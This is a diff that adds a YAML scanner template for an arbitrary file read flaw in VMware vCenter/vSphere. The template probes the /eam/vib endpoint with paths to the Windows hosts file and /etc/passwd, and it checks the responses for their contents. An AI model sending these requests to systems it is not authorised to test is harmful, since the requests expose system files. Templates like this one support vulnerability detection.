@@ -1,0 +1,17 @@
+name: VMware-vCenter-VMware-vSphere-arbitrary-file-read
+description: >
+  任意文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /eam/vib?id=C:\Windows\System32\drivers\etc\hosts
+    expression:
+      status: 200
+      body_all: ["sample HOSTS"]
+  - method: GET
+    path: /eam/vib?id=/etc/passwd
+    expression:
+      status: 200
+      body_all:
+        - "root:"
